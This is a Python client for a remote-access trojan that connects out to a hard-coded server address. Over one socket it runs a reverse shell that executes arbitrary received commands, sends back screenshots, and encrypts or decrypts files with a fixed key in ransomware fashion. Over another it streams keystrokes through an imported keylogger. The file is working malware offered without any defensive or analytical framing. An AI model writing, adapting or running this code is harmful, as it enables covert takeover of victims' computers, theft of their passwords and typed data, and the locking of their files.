import socket, os, subprocess, sys
import  io
import threading

from KeyLogger import KeyLog
from LockFile import LockFile

try:
    import pyautogui
except KeyError:
    pyautogui_imported = False
else:
    pyautogui_imported = True




# SERVER_HOST = sys.argv[1]
SERVER_HOST = "192.168.89.229"
SERVER_PORT_KEYLOGGER = 5000
SERVER_PORT_SHELL = 5005
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"




def client_shell():
    s = socket.socket()
    print("before shell connect")
    s.connect((SERVER_HOST, SERVER_PORT_SHELL))
    print("after shell connect")
    cwd = os.getcwd()
    s.send(cwd.encode())
    print('after send!')
    while True:
        command = s.recv(BUFFER_SIZE).decode()
        print(f"comand: {command}")
        splited_command = command.split()
        if command.lower() == 'exit':
            break
        if splited_command[0] == 'cd':
            try:
                os.chdir(' '.join(splited_command[1:]))
            except Exception as e:
                output = str(e)
            else:
                output = ""
        elif splited_command[0] == 'src':
            print('call take picture')
            screenshot = pyautogui.screenshot()
            # Convert screenshot to bytes
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_data = img_bytes.getvalue()
            s.sendall(f"{len(img_data)}{SEPARATOR}{'image'}".encode())
            s.sendall(img_data)
            output = ""
        elif (splited_command[0] == 'de') | (splited_command[0] == 'en') :
            l = LockFile()
            l.solve("123",splited_command[0],splited_command[1])
            if splited_command[0] == "en":
                output = "Encrypt sucessfully!"
            else:
                output = "Decrypt sucessfully!"
        else:
            output = subprocess.getoutput(command)
        # print(f"output {output}")
        cwd = os.getcwd()
        message = f"{output}{SEPARATOR}{cwd}"
        print(message)
        s.send(message.encode())


def client_keylogger():
    s = socket.socket()
    print("before klg connect")
    s.connect((SERVER_HOST, SERVER_PORT_KEYLOGGER))
    print("before shell connect")
    klg = KeyLog(s, SEPARATOR, socket.gethostname())
    while True:
        x = 1


t1 = threading.Thread(target=client_shell)
t2 = threading.Thread(target=client_keylogger)


t1.start()
t2.start()


t1.join()
t2.join()




# def take_screenshot(socket):
#     screenshot = pyautogui.screenshot()
#     # Convert screenshot to bytes
#     img_bytes = io.BytesIO()
#     screenshot.save(img_bytes, format='PNG')
#     img_data = img_bytes.getvalue()
#     socket.sendall(f"{len(img_data).to_bytes(4, byteorder='big')}{SEPARATOR}{'image'}")



